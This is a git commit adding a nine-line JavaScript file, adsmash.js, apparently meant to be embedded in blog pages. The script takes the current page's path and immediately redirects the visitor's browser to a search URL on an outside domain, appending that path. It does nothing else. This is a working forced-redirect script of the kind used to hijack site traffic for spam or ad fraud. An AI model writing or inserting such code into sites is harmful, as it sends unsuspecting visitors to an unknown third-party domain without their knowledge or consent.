540fa375c7934212d1fa9c0933ccbbee7fba6a51
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-06-14 15:59:51 +0800

    Create adsmash.js

---
+++ adsmash.js
@@ -0,0 +1,9 @@
+var urlmain = document.URL;
+var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
+var dataUrl = [
+
+ "https://bo.1st.yt/register.php?do=search&q=",
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem + param;
